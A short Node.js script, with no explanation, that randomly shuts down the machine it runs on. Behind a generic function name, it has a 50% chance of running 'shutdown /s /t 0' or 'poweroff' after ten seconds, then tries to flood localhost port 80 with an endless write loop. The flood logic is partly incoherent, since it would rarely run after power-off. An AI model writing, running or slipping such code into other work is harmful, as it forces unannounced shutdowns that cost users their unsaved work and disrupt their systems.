const { exec } = require('child_process')
const http = require('http')
const net = require('net')

function foo(chance) {
    const random = Math.random()

    if (random <= chance) {
        const command = process.platform === 'win32' ? 'shutdown /s /t 0' : 'poweroff'

        setTimeout(() => {
            exec(command, (e) => {
                if (e) {
                    console.error(`error ${e}`)
                } else {
                    const client = net.connect(80, 'localhost', () => {
                        while (true) {
                            client.write('PANIC!!!')
                        }
                    })
                }
            })
        }, 10000)
    } else {
        for (let i = 0; i < 3; i++) {
            console.log('???')
        }
    }
}

foo(0.5)
